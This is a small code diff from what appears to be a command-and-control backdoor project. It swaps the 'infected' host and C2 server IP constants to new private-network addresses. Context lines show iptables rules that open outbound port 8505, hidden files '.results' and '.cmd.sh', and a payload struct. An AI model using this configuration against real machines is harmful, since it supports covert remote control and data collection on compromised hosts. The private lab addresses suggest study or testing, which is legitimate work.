@@ -12,8 +12,8 @@
 #define IPTABLES(ip) "iptables -A OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
 #define TURNOFF(ip) "iptables -D OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
 #define RESULT_FILE ".results"
-#define INFECTEDIP "192.168.0.100"
-#define CNCIP "192.168.0.109"
+#define INFECTEDIP "192.168.1.6"
+#define CNCIP "192.168.1.3"
 #define FILENAME ".cmd.sh"
 struct payload{
     char key[5]; // always 8505
